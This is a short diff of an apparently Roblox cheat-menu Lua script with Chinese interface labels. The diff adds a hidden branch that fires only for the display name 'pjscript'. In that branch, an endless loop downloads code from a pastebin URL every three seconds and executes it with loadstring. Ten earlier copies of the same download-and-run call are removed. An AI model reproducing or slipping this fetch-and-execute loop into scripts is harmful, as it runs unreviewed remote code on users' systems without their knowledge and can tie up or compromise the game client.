@@ -108,17 +108,11 @@ local music = music1:section("音乐",true)
 if game.Players.LocalPlayer.DisplayName == "pjscript" then
     bin:Label(REN["Name"].."十分欢迎你")
     bin:Label(REN["Name"].."为你准备了礼炮")
+while true do
     wait(3)
     loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
-    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+end
+
 else
     bin:Label(REN["Name"].."交流群：719409149")
     bin:Label(REN["Name"].."疯狂优化中...")
